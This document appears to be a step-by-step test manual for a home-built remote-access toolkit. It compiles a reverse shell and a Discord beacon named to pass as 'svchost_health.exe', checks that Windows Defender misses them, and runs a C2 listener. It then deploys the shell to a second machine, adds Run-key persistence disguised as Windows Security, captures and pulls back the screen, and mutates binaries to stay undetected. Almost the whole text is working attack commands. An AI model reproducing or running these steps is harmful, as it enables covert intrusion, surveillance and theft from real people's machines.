# CHEYANNE — Full Test Manual
## Birth to Finish. Every step. Your hands.

---

## PHASE 0: SETUP (Your Machine)

### 0.1 — Open Admin PowerShell
```powershell
# Verify Defender exclusions exist
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
# Must show: C:\Users\gwu07\Desktop\cheyanne
```

### 0.2 — Navigate to Cheyanne
```powershell
cd C:\Users\gwu07\Desktop\cheyanne
```

---

## PHASE 1: FRESH COMPILATION

### 1.1 — Open Developer Command Prompt
Start Menu → "Developer Command Prompt for VS" (or x64 Native Tools)

### 1.2 — Compile the Shell
```cmd
cd C:\Users\gwu07\Desktop\cheyanne\shell
cl /O1 /GS- /utf-8 /Fe:cheyanne_shell.exe vader_shell.c /link ws2_32.lib advapi32.lib kernel32.lib ucrt.lib vcruntime.lib msvcrt.lib /SUBSYSTEM:WINDOWS /ENTRY:WinMain
```
**Expected:** `cheyanne_shell.exe` appears. No errors.

### 1.3 — Compile the Discord Beacon
```cmd
cd C:\Users\gwu07\Desktop\cheyanne\agent
cl /O2 /Fe:svchost_health.exe discord_implant_c.c winhttp.lib advapi32.lib user32.lib
```
**Expected:** `svchost_health.exe` appears. No errors.

### 1.4 — Check file sizes
```cmd
dir cheyanne_shell.exe
dir ..\agent\svchost_health.exe
```
**Expected:** Shell ~6KB, Beacon ~15-20KB. Small = good.

---

## PHASE 2: DEFENDER EVASION TEST

### 2.1 — Scan Shell
```powershell
& "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\Users\gwu07\Desktop\cheyanne\shell\cheyanne_shell.exe" -DisableRemediation
```
**Expected:** "found no threats" = CLEAN

### 2.2 — Scan Beacon
```powershell
& "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\Users\gwu07\Desktop\cheyanne\agent\svchost_health.exe" -DisableRemediation
```
**Expected:** "found no threats" = CLEAN

### 2.3 — Copy to non-excluded folder (REAL test)
```powershell
Copy-Item "C:\Users\gwu07\Desktop\cheyanne\shell\cheyanne_shell.exe" "C:\Users\Public\test_shell.exe"
Start-Sleep -Seconds 10
Test-Path "C:\Users\Public\test_shell.exe"
```
**Expected:** Returns `True` — Defender didn't eat it.
**Cleanup:** `Remove-Item "C:\Users\Public\test_shell.exe"`

---

## PHASE 3: C2 LISTENER

### 3.1 — Start C2 (from cheyanne directory)
```powershell
cd C:\Users\gwu07\Desktop\cheyanne
python vader_menu.py
```
Press **D** for C2 Shell (Dual Channel)

### 3.2 — Verify listener
```
vader> sessions
```
**Expected:** Empty or Discord-only sessions. TCP listener on port 4443.

---

## PHASE 4: LOCAL SHELL TEST (Your own machine first)

### 4.1 — Run shell locally
Open a NEW terminal:
```powershell
cd C:\Users\gwu07\Desktop\cheyanne\shell
.\cheyanne_shell.exe 127.0.0.1 4443
```

### 4.2 — Check C2
Back in the C2 terminal:
```
vader> sessions
```
**Expected:** New TCP session from 127.0.0.1

### 4.3 — Interact
```
vader> interact <first-few-chars-of-session-id>
whoami
hostname
dir
back
```
**Expected:** Your username, your hostname, directory listing. All working.

### 4.4 — Kill the local shell
Task Manager → find `cheyanne_shell.exe` → End Task
Check C2 → session should show as "dead" after a moment.

---

## PHASE 5: PERSISTENCE TEST (Local)

### 5.1 — Check reg key was auto-created
```powershell
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurityHealth
```
**Expected:** Shows path to `cheyanne_shell.exe`
(Auto-persist wrote this when the shell ran in Phase 4)

### 5.2 — Delete it (cleanup for local test)
```powershell
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurityHealth /f
```

---

## PHASE 6: DEPLOY TO RADON

### 6.1 — Transfer shell to Radon
**Option A — HTTP serve (best for binaries):**
Your machine:
```powershell
cd C:\Users\gwu07\Desktop\cheyanne\shell
python -m http.server 8888
```
On Radon (via existing VADER shell or manual):
```
powershell -c "Invoke-WebRequest -Uri 'http://192.168.1.92:8888/cheyanne_shell.exe' -OutFile 'C:\Users\Public\cheyanne_shell.exe'"
```

**Option B — USB/shared folder/RDP** — whatever works.

### 6.2 — Run shell on Radon
On Radon:
```cmd
C:\Users\Public\cheyanne_shell.exe 192.168.1.92 4443
```

### 6.3 — Verify in C2
```
vader> sessions
```
**Expected:** New TCP session from 192.168.1.145

### 6.4 — Interact + recon
```
vader> interact <id>
whoami
hostname
ipconfig
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
tasklist | findstr MsMpEng
back
```

---

## PHASE 7: PERSISTENCE TEST (Radon)

### 7.1 — Verify auto-persist wrote the reg key
```
vader> interact <radon-session>
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurityHealth
```
**Expected:** Path to `cheyanne_shell.exe`

### 7.2 — Reboot Radon
Tell Raed to restart, or via shell:
```
shutdown /r /t 5
```
(Shell will die. That's expected.)

### 7.3 — Wait 60-90 seconds
Watch C2 for:
```
[+] SHELL: xxxxxxxx connected from 192.168.1.145
```
**Expected:** New session appears WITHOUT anyone touching Radon.

### 7.4 — Verify working directory
```
vader> interact <new-session>
cd
```
**Expected:** `C:\Windows\System32` = launched from reg key (persistence)
NOT `C:\Users\Public` = would mean same process (reconnect only)

---

## PHASE 8: SCREENSHOT CAPTURE (Remote)

### 8.1 — Take screenshot on Radon
Through the shell:
```
powershell -c "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b = [System.Drawing.Rectangle]::FromLTRB(0,0,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height); [System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$b.Size); $bmp.Save('C:\Users\Public\screen.png')"
```

### 8.2 — Verify screenshot exists
```
dir C:\Users\Public\screen.png
```

### 8.3 — Transfer screenshot to your machine
On Radon shell:
```
powershell -c "Start-Process python -ArgumentList '-m','http.server','9999' -WorkingDirectory 'C:\Users\Public' -WindowStyle Hidden"
```
On YOUR machine:
```powershell
Invoke-WebRequest -Uri "http://192.168.1.145:9999/screen.png" -OutFile "$HOME\Desktop\radon_screenshot.png"
```
Open it. You should see Radon's desktop.

### 8.4 — Cleanup
```
del C:\Users\Public\screen.png
taskkill /f /im python.exe
```

---

## PHASE 9: DISCORD BEACON TEST

### 9.1 — Deploy beacon to Radon
Same as shell — HTTP serve or manual copy `svchost_health.exe` to Radon.

### 9.2 — Run beacon
On Radon:
```cmd
C:\Users\Public\svchost_health.exe
```

### 9.3 — Check Discord channel
Open your Discord → the webhook channel → should see recon data:
- hostname, username, IP config, running processes, AV status

### 9.4 — Check C2
```
vader> sessions
```
**Expected:** Discord beacon session appears alongside TCP shell.

---

## PHASE 10: MUTATION TEST

### 10.1 — Run mutation
```powershell
cd C:\Users\gwu07\Desktop\cheyanne
python mutate.py
```
**Expected:** All components get new XOR keys, recompile, scan clean.

### 10.2 — Verify different hashes
```powershell
Get-FileHash .\shell\cheyanne_shell.exe | Select-Object Hash
```
Compare with hash from Phase 1. **Must be different** = mutation worked.

### 10.3 — Re-scan
Repeat Phase 2 scans. Everything must still be CLEAN.

---

## PHASE 11: FRESH BUILD (One Button)

### 11.1 — From the menu
```
VADER > F
```
(Fresh Build — auto-detect IP → mutate all → compile shell → scan)

### 11.2 — Verify
- New XOR keys applied
- Shell compiled with your current IP
- All scans CLEAN

---

## KILL CHECKLIST — What You've Proven

| Test | Status |
|------|--------|
| Fresh compile | |
| Defender scan CLEAN | |
| Defender real-world test (non-excluded folder) | |
| Local shell connection | |
| Local shell interaction (whoami, dir) | |
| Auto-persist reg key written | |
| Remote shell (Radon) | |
| Remote interaction | |
| Persistence survives reboot | |
| Working dir = System32 (confirms reg key launch) | |
| Screenshot capture on target | |
| Screenshot transfer to operator | |
| Discord beacon recon | |
| Dual-channel (TCP + Discord simultaneous) | |
| Mutation changes binary hash | |
| Post-mutation Defender scan CLEAN | |
| Fresh Build one-button | |

Fill each box with a checkmark as you go. When all 17 are checked, Cheyanne is battle-tested.

---

*For Cheyanne. Always.*
